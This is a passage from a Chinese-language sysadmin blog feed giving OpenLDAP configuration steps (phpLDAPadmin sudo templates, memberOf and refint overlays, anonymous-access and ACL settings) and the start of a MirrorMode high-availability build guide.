class="name">display</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span>&gt;</span>3<span class="tag">&lt;/<span class="name">order</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">page</span>&gt;</span>1<span class="tag">&lt;/<span class="name">page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spacer</span>&gt;</span>1<span class="tag">&lt;/<span class="name">spacer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">attribute</span> <span class="attr">id</span>=<span class="string">"sudoCommand"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display</span>&gt;</span>Sudo Command<span class="tag">&lt;/<span class="name">display</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span>&gt;</span>4<span class="tag">&lt;/<span class="name">order</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">page</span>&gt;</span>1<span class="tag">&lt;/<span class="name">page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spacer</span>&gt;</span>1<span class="tag">&lt;/<span class="name">spacer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">attribute</span> <span class="attr">id</span>=<span class="string">"sudoUser"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display</span>&gt;</span>Sudo Users<span class="tag">&lt;/<span class="name">display</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>=php.MultiList(/,(objectClass=posixAccount),uid,%uid%</span><br><span class="line">(%cn%),sudoUser)<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span>&gt;</span>5<span class="tag">&lt;/<span class="name">order</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">page</span>&gt;</span>1<span class="tag">&lt;/<span class="name">page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spacer</span>&gt;</span>1<span class="tag">&lt;/<span class="name">spacer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">attribute</span> <span class="attr">id</span>=<span class="string">"sudoHost"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display</span>&gt;</span>Sudo Hosts<span class="tag">&lt;/<span class="name">display</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span>&gt;</span>10<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span>&gt;</span>6<span class="tag">&lt;/<span class="name">order</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">page</span>&gt;</span>1<span class="tag">&lt;/<span class="name">page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spacer</span>&gt;</span>1<span class="tag">&lt;/<span class="name">spacer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">attribute</span> <span class="attr">id</span>=<span class="string">"description"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">type</span>&gt;</span>textarea<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display</span>&gt;</span>Description<span class="tag">&lt;/<span class="name">display</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span>&gt;</span>7<span class="tag">&lt;/<span class="name">order</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">page</span>&gt;</span>1<span class="tag">&lt;/<span class="name">page</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">attributes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>vim  /usr/share/phpldapadmin/templates/modification/sudo.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE template SYSTEM "template.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Sudo Policy<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^cn=.*,ou=SUDOers,dc=.*<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">icon</span>&gt;</span>images/door.png<span class="tag">&lt;/<span class="name">icon</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>Sudo Policy<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">askcontainer</span>&gt;</span>1<span class="tag">&lt;/<span class="name">askcontainer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rdn</span>&gt;</span>cn<span class="tag">&lt;/<span class="name">rdn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">visible</span>&gt;</span>1<span class="tag">&lt;/<span class="name">visible</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">objectClasses</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">objectClass</span> <span class="attr">id</span>=<span class="string">"sudoRole"</span>&gt;</span><span class="tag">&lt;/<span class="name">objectClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">objectClasses</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">attributes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">attribute</span> <span class="attr">id</span>=<span class="string">"cn"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display</span>&gt;</span>Policy Name<span class="tag">&lt;/<span class="name">display</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span>&gt;</span>1<span class="tag">&lt;/<span class="name">order</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">page</span>&gt;</span>1<span class="tag">&lt;/<span class="name">page</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">attribute</span> <span class="attr">id</span>=<span class="string">"sudoOption"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display</span>&gt;</span>Sudo Option<span class="tag">&lt;/<span class="name">display</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span>&gt;</span>2<span class="tag">&lt;/<span class="name">order</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">page</span>&gt;</span>1<span class="tag">&lt;/<span class="name">page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spacer</span>&gt;</span>1<span class="tag">&lt;/<span class="name">spacer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">attribute</span> <span class="attr">id</span>=<span class="string">"sudoRunAsUser"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display</span>&gt;</span>Sudo Run As User<span class="tag">&lt;/<span class="name">display</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span>&gt;</span>3<span class="tag">&lt;/<span class="name">order</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">page</span>&gt;</span>1<span class="tag">&lt;/<span class="name">page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spacer</span>&gt;</span>1<span class="tag">&lt;/<span class="name">spacer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">attribute</span> <span class="attr">id</span>=<span class="string">"sudoCommand"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display</span>&gt;</span>Sudo Command<span class="tag">&lt;/<span class="name">display</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span>&gt;</span>4<span class="tag">&lt;/<span class="name">order</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">page</span>&gt;</span>1<span class="tag">&lt;/<span class="name">page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spacer</span>&gt;</span>1<span class="tag">&lt;/<span class="name">spacer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">attribute</span> <span class="attr">id</span>=<span class="string">"sudoUser"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display</span>&gt;</span>Sudo Users<span class="tag">&lt;/<span class="name">display</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span>&gt;</span>5<span class="tag">&lt;/<span class="name">order</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">page</span>&gt;</span>1<span class="tag">&lt;/<span class="name">page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spacer</span>&gt;</span>1<span class="tag">&lt;/<span class="name">spacer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">attribute</span> <span class="attr">id</span>=<span class="string">"sudoHost"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display</span>&gt;</span>Sudo Hosts<span class="tag">&lt;/<span class="name">display</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;array&gt;10&lt;/array&gt; --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span>&gt;</span>6<span class="tag">&lt;/<span class="name">order</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">page</span>&gt;</span>1<span class="tag">&lt;/<span class="name">page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spacer</span>&gt;</span>1<span class="tag">&lt;/<span class="name">spacer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">attribute</span> <span class="attr">id</span>=<span class="string">"description"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">type</span>&gt;</span>textarea<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display</span>&gt;</span>Description<span class="tag">&lt;/<span class="name">display</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span>&gt;</span>7<span class="tag">&lt;/<span class="name">order</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">page</span>&gt;</span>1<span class="tag">&lt;/<span class="name">page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">cols</span>&gt;</span>200<span class="tag">&lt;/<span class="name">cols</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rows</span>&gt;</span>10<span class="tag">&lt;/<span class="name">rows</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">attributes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>重启httpd服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure>

<p>浏览器查看(ou=SUODers,dc=example,dc=com 创建一条子目录 sudoRole)</p>
<p><img src="/articles/be8d00d3/3.png" alt></p>
<h2 id="windows下的一个OpenLDAP管理工具-LdapAdmin"><a href="#windows下的一个OpenLDAP管理工具-LdapAdmin" class="headerlink" title="windows下的一个OpenLDAP管理工具 LdapAdmin"></a>windows下的一个OpenLDAP管理工具 LdapAdmin</h2><p>下载地址 <a href="http://www.ldapadmin.org/download/ldapadmin.html" target="_blank" rel="noopener">LdapAdmin</a>, 当前最新版本是<a href="https://sourceforge.net/projects/ldapadmin/files/ldapadmin/1.8.3/LdapAdminExe-w64-1.8.3.zip/download" target="_blank" rel="noopener">1.8.3</a>。 下载后直接解压就是一个exe文件。</p>
<h3 id="创建连接到openldap服务"><a href="#创建连接到openldap服务" class="headerlink" title="创建连接到openldap服务"></a>创建连接到openldap服务</h3><p><img src="/articles/be8d00d3/4.png" alt></p>
<h3 id="配置一个运维组ops，然后将用户800001加入到ops组"><a href="#配置一个运维组ops，然后将用户800001加入到ops组" class="headerlink" title="配置一个运维组ops，然后将用户800001加入到ops组"></a>配置一个运维组ops，然后将用户800001加入到ops组</h3><p><img src="/articles/be8d00d3/5.png" alt></p>
<h2 id="开启memberOf"><a href="#开启memberOf" class="headerlink" title="开启memberOf"></a>开启memberOf</h2><p>默认情况下openldap的用户组属性是Posixgroup，Posixgroup用户组属性和用户没有实际的对应关系。如果要对应起来的话，就需要单独把用户设置到Posixgroup中</p>
<p>开启memberOf之后可以配置groupOfUniqueNames用户组属性，可以根据用户组过滤用户，这个过滤是唯一的</p>
<p>开启memberof，并让新增用户支持memberof</p>
<p>创建 memberof_config.ldif</p>
<figure class="highlight ldif"><table><tr><td class="code"><pre><span class="line"><span class="attribute">dn</span>: cn=module&#123;0&#125;,cn=config</span><br><span class="line"><span class="attribute">cn</span>: modulle&#123;0&#125;</span><br><span class="line"><span class="attribute">objectClass</span>: olcModuleList</span><br><span class="line"><span class="attribute">objectclass</span>: top</span><br><span class="line"><span class="attribute">olcModuleload</span>: memberof.la</span><br><span class="line"><span class="attribute">olcModulePath</span>: /usr/lib64/openldap</span><br><span class="line"></span><br><span class="line"><span class="attribute">dn</span>: olcOverlay=&#123;0&#125;memberof,olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line"><span class="attribute">objectClass</span>: olcConfig</span><br><span class="line"><span class="attribute">objectClass</span>: olcMemberOf</span><br><span class="line"><span class="attribute">objectClass</span>: olcOverlayConfig</span><br><span class="line"><span class="attribute">objectClass</span>: top</span><br><span class="line"><span class="attribute">olcOverlay</span>: memberof</span><br><span class="line"><span class="attribute">olcMemberOfDangling</span>: ignore</span><br><span class="line"><span class="attribute">olcMemberOfRefInt</span>: TRUE</span><br><span class="line"><span class="attribute">olcMemberOfGroupOC</span>: groupOfNames</span><br><span class="line"><span class="attribute">olcMemberOfMemberAD</span>: member</span><br><span class="line"><span class="attribute">olcMemberOfMemberOfAD</span>: memberOf</span><br></pre></td></tr></table></figure>

<p>创建 refint1.ldif</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dn: cn=module&#123;0&#125;,cn=config</span><br><span class="line">add: olcmoduleload</span><br><span class="line">olcmoduleload: refint</span><br></pre></td></tr></table></figure>

<p>创建 refint2.ldif</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dn: olcOverlay=refint,olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">objectClass: olcConfig</span><br><span class="line">objectClass: olcOverlayConfig</span><br><span class="line">objectClass: olcRefintConfig</span><br><span class="line">objectClass: top</span><br><span class="line">olcOverlay: refint</span><br><span class="line">olcRefintAttribute: memberof member manager owner</span><br></pre></td></tr></table></figure>

<p>导入配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ldapadd -Q -Y EXTERNAL -H ldapi:/// -f memberof_config.ldif</span><br><span class="line">ldapmodify -Q -Y EXTERNAL -H ldapi:/// -f refint1.ldif</span><br><span class="line">ldapadd -Q -Y EXTERNAL -H ldapi:/// -f refint2.ldif</span><br><span class="line"><span class="comment"># 导入refint2时如果有报错，把最后一句改为：olcRefintAttribute: memberof uniqueMember  manager owner</span></span><br></pre></td></tr></table></figure>

<p>验证一下配置，这个命令可以列出所有配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">slapcat -b cn=config</span><br></pre></td></tr></table></figure>

<h2 id="禁止匿名访问"><a href="#禁止匿名访问" class="headerlink" title="禁止匿名访问"></a><strong>禁止匿名访问</strong></h2><p>默认情况下匿名用户可以获取所有用户信息，甚至是密码字段，虽然密码字段是经过加密的那也很危险</p>
<p>创建disable_anon.ldif文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dn: cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">add: olcDisallows</span><br><span class="line">olcDisallows: bind_anon</span><br><span class="line"></span><br><span class="line">dn: cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">add: olcRequires</span><br><span class="line">olcRequires: authc</span><br><span class="line"></span><br><span class="line">dn: olcDatabase=&#123;-1&#125;frontend,cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">add: olcRequires</span><br><span class="line">olcRequires: authc</span><br></pre></td></tr></table></figure>

<p>导入配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapadd -Q -Y EXTERNAL -H ldapi:/// -f disable_anon.ldif</span><br></pre></td></tr></table></figure>

<h2 id="设置ACL"><a href="#设置ACL" class="headerlink" title="设置ACL"></a>设置ACL</h2><p>拒绝所有用户查看用户信息，并且添加有ldap管理账号</p>
<p>创建acl.ldif</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dn: olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">replace: olcAccess</span><br><span class="line">olcAccess: to attrs=userPassword</span><br><span class="line">  by anonymous auth</span><br><span class="line">  by dn.base=&quot;cn=ldapadmin,ou=manage,dc=taovip,dc=com&quot; write</span><br><span class="line">  by * none</span><br><span class="line">olcAccess: to *</span><br><span class="line">  by anonymous auth</span><br><span class="line">  by dn.base=&quot;cn=ldapadmin,ou=manage,dc=taovip,dc=com&quot; write</span><br><span class="line">  by dn.base=&quot;cn=ldapread,ou=manage,dc=taovip,dc=com&quot; read</span><br><span class="line">  by * none</span><br></pre></td></tr></table></figure>

<p>导入配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapmodify -Q -Y EXTERNAL -H ldapi:/// -f acl.ldif</span><br></pre></td></tr></table></figure>

<p>删除ACL</p>
<p>创建文件del_acl.ldif</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dn: olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">delete: olcAccess</span><br><span class="line">olcAccess: &#123;0&#125;</span><br></pre></td></tr></table></figure>

<p>导入配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapmodify -Q -Y EXTERNAL -H ldapi:/// -f acl.ldif</span><br></pre></td></tr></table></figure>

<h2 id="创建管理用户"><a href="#创建管理用户" class="headerlink" title="创建管理用户"></a>创建管理用户</h2><p>创建add_ou.ldif</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dn: ou=manage,dc=example,dc=com</span><br><span class="line">ou: manage</span><br><span class="line">description: Directory Manage</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: organizationalUnit</span><br></pre></td></tr></table></figure>

<p>创建add_manage_user.ldif</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n: cn=ldapadmin,ou=manage,dc=example,dc=com</span><br><span class="line">cn: ldapadmin</span><br><span class="line">sn: ldapadmin</span><br><span class="line">uid: ldapadmin</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: shadowAccount</span><br><span class="line">objectClass: inetOrgPerson</span><br><span class="line">objectClass: organizationalPerson</span><br><span class="line">objectClass: person</span><br><span class="line">userPassword: &#123;SSHA&#125;4eDZHnxvfOOoAgSM6tDLDueCIUB9sRuDHVpVJ</span><br><span class="line"></span><br><span class="line">dn: cn=ldapread,ou=manage,dc=example,dc=com</span><br><span class="line">cn: ldapread</span><br><span class="line">sn: ldapread</span><br><span class="line">uid: ldapread</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: shadowAccount</span><br><span class="line">objectClass: inetOrgPerson</span><br><span class="line">objectClass: organizationalPerson</span><br><span class="line">objectClass: person</span><br><span class="line">userPassword: &#123;SSHA&#125;4eDZHnxvfOOoAgSM6tDLDueCIUB9sRuDHVpVJ</span><br></pre></td></tr></table></figure>

<p>导入配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapadd -x -D cn=root,dc=example,dc=com -W -f add_ou.ldif</span><br><span class="line">ldapadd -x -D cn=root,dc=example,dc=com -W -f add_manage_user.ldif</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Openldap</tag>
      </tags>
  </entry>
  <entry>
    <title>基于OpenLDAP_MirrorMode的OpenLDAP高可用</title>
    <url>/articles/1c70a485.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>LDAP是一款轻量级目录访问协议（Lightweight Directory Access Protocol，简称LDAP），属于开源集中账号管理架构的实现，且支持众多系统版本，被广大互联网公司所采用。目录服务是一种特殊的数据库系统，对于数据的读取、浏览、搜索有很好的效果。同时做为用户中心，数据库的高可用显得尤为重要。在客户生产环境中使用的是客户的负载均衡设备，基于思杰的硬件负载均衡设备，后端配置的是OpenLDAP_MirrorMode,相当于Mysql的双主模式，后面某一台服务器出现问题，负载均衡会将后端的服务器剔除，另一台仍能提供服务，如下图所示<br><img src="/articles/1c70a485/1.png" alt="1"></p>
<a id="more"></a>

<h2 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h2><p>操作系统: centos 7.2<br>服务器A：10.10.1.134<br>服务器B：10.10.1.132</p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
<li><p>下载软件： </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /home/admin/openldap &amp;&amp; cd /home/admin/openldap</span><br><span class="line"></span><br><span class="line">wget ftp://ftp.openldap.org/pub/OpenLDAP/openldap- release/openldap-2.4.23.tgz</span><br><span class="line">wget http://download.oracle.com/berkeley-db/db-4.6.21.tar.gz</span><br></pre></td></tr></table></figure>
</li>
<li><p>关闭selinux </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed -i '/SELINUX/s/enforcing/disabled/' /etc/selinux/config &amp;&amp; sestatus</span><br></pre></td></tr></table></figure>
</li>
<li><p>防火墙关闭 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/bin/systemctl disable firewalld.service &amp;&amp; /bin/systemctl stop firewalld.service</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置yum源为阿里云yum源</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">从阿里云镜像网站下载yum源配置文件到yum目录中</span></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo </span><br><span class="line"><span class="meta"> #</span><span class="bash">修改版本号为redhat7</span></span><br><span class="line">sed -i 's/$releasever/7/g' /etc/yum.repos.d/CentOS-Base.repo</span><br><span class="line"><span class="meta">#</span><span class="bash">清空yum缓存</span></span><br><span class="line">yum clean all</span><br><span class="line"><span class="meta">#</span><span class="bash">生成列表</span></span><br><span class="line">yum list</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装openldap环境所需要的依赖包。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install libtool-ltdl libtool-ltdl-devel gcc openssl openssl-devel cyrus-sasl-lib.x86_64 cyrus-sasl-devel.x86_64 cyrus-sasl-plain.x86_64 cyrus-sasl-md5.x86_64 cyrus-sasl-ldap.x86_64</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h2 id="安装openldap和Berkeley-DB"><a href="#安装openldap和Berkeley-DB" class="headerlink" title="安装openldap和Berkeley DB"></a>安装openldap和Berkeley DB</h2><h4 id="1-写在安装之前："><a href="#1-写在安装之前：" class="headerlink" title="1. 写在安装之前："></a>1. 写在安装之前：</h4><p>编译安装openldap需要数据库的支持，openldap的数据库支持<br>Berkeley DB,Oracle,Mysql,MariaDB,GDBM等数据库。默认openldap采用Berkeley DB，并且openldap对数据库有一定的要求，openldap 2.4的软件为例，需要Berkeley DB 4.4版本以上,所以在编译安装openldap源码包时需要先下载安装Berkeley DB</p>
<h4 id="2-编译安装Berkeley-DB"><a href="#2-编译安装Berkeley-DB" class="headerlink" title="2. 编译安装Berkeley DB"></a>2. 编译安装Berkeley DB</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xf db-4.6.21.tar.gz -C /usr/local/src</span><br><span class="line">cd /usr/local/src/db-4.6.21/build_unix/ &amp;&amp; mkdir /usr/local/BDB</span><br><span class="line">../dist/configure --prefix=/usr/local/BDB</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">echo "/usr/local/BDB/lib/" &gt; /etc/ld.so.conf.d/bdb.conf</span><br><span class="line">ldconfig -v</span><br><span class="line">ln -sv /usr/local/BDB/include /usr/include/BDB</span><br></pre></td></tr></table></figure>

<h4 id="3-编译安装openldap"><a href="#3-编译安装openldap" class="headerlink" title="3. 编译安装openldap"></a>3. 编译安装openldap</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -xf openldap-2.4.23.tgz -C /usr/<span class="built_in">local</span>/src/</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/src/openldap-2.4.23/</span><br><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/openldap --<span class="built_in">enable</span>-syslog --<span class="built_in">enable</span>-modules --<span class="built_in">enable</span>-debug --with-tls CPPFLAGS=-I/usr/<span class="built_in">local</span>/BDB/include/ LDFLAGS=-L/usr/<span class="built_in">local</span>/BDB/lib/ --<span class="built_in">enable</span>-ldap --<span class="built_in">enable</span>-relay --<span class="built_in">enable</span>-accesslog --<span class="built_in">enable</span>-auditlog --<span class="built_in">enable</span>-syncprov --with-cyrus-sasl --<span class="built_in">enable</span>-spasswd</span><br><span class="line">make depend</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"/usr/local/openldap/lib/"</span> &gt; /etc/ld.so.conf.d/ldap.conf</span><br><span class="line">ldconfig -v</span><br><span class="line">ln -sv /usr/<span class="built_in">local</span>/openldap/include/ /usr/include/ldap</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/openldap/bin/* /usr/<span class="built_in">local</span>/bin/</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/openldap/sbin/* /usr/<span class="built_in">local</span>/sbin/</span><br></pre></td></tr></table></figure>

<h2 id="配置openldap"><a href="#配置openldap" class="headerlink" title="配置openldap"></a>配置openldap</h2><h4 id="1-配置openldap的方法有两种："><a href="#1-配置openldap的方法有两种：" class="headerlink" title="1. 配置openldap的方法有两种："></a>1. 配置openldap的方法有两种：</h4><ul>
<li>通过修改配置文件实现配置</li>
<li>通过配置数据库的形式完成配置（slapd.d下的数据库配置文件）,属于动态配置不需要重启slapd进程,<br>此配置文件在cn=config目录下的LDIF的配置文件 。此文件不建议手动修改，用ldap命令生成。</li>
</ul>
<h4 id="2-配置rootdn密码-optional"><a href="#2-配置rootdn密码-optional" class="headerlink" title="2. 配置rootdn密码(optional)"></a>2. 配置rootdn密码(optional)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/openldap/bin/slappasswd  <span class="comment">#此密码记住，后面配置openldap会用到。</span></span><br></pre></td></tr></table></figure>

<h4 id="3-创建用户ldap"><a href="#3-创建用户ldap" class="headerlink" title="3. 创建用户ldap"></a>3. 创建用户ldap</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd ldap</span><br></pre></td></tr></table></figure>

<h4 id="4-创建数据目录以及日志文件"><a href="#4-创建数据目录以及日志文件" class="headerlink" title="4. 创建数据目录以及日志文件"></a>4. 创建数据目录以及日志文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir /data/openldap/&#123;data,<span class="built_in">log</span>,var&#125; -p</span><br><span class="line"><span class="built_in">cd</span> /data/openldap/var/</span><br><span class="line">mkdir run</span><br></pre></td></tr></table></figure>

<h4 id="5-修改权限："><a href="#5-修改权限：" class="headerlink" title="5. 修改权限："></a>5. 修改权限：</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /usr/<span class="built_in">local</span>/openldap/etc/openldap/DB_CONFIG.example /data/openldap/data/DB_CONFIG</span><br><span class="line">chown -R ldap:ldap /data/openldap/data</span><br><span class="line">chmod 700 -R /data/openldap/data</span><br></pre></td></tr></table></figure>

